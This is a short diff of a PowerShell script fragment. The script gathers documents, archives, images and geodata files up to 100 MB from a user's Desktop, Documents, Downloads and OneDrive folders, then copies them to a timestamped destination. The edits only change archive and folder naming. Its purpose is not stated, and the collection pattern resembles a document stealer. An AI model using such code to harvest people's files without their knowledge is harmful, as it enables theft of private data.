@@ -82,7 +82,7 @@ $currDate = (Get-Date -UFormat %d.%m.%y)
 $currYear = (Get-Date -UFormat %Y)
 $size = 100*1024*1024
 $exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*.kme','*.kml','*.kmz','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
-$archname = $env:COMPUTERNAME + '_' + $CurrDateTime + '.zip'
+#$archname = $env:COMPUTERNAME + '_' + $CurrDateTime + '.zip'
 $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
 
     if ($objName -eq "") { $objName = $env:COMPUTERNAME }
@@ -113,7 +113,7 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
     
     if ($Stream) {
         $etalonhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
-        $sendDestDir = $destDir + $objName + '_' + $CurrDateTime
+        $sendDestDir = $destDir + $CurrDateTime
         
         Secure-Copy -param $true
 
